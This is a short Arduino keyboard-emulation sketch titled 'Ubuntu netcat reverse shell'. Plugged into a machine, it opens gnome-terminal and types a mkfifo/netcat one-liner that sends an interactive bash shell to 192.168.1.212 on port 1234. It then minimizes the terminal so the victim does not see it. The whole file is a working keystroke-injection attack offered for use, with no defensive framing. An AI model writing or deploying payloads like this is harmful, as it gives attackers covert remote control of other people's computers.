// Title: Ubuntu netcat reverse shell
// Author: Rennan Cockles

#include <Keyboard.h>

Keyboard kb;


void setup() {  
    Serial.begin(9600);
    delay(1000);

    kb.ALT_F2();
    delay(500);
    kb.STRING("gnome-terminal");
    kb.ENTER();
    delay(1500);
    kb.STRING("[ -e /tmp/f ] && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.212 1234 >/tmp/f");
    kb.ENTER();
    delay(1000);
    kb.ALT_SPACE();
    delay(500);
    kb.STRING("n");
}


void loop(){}
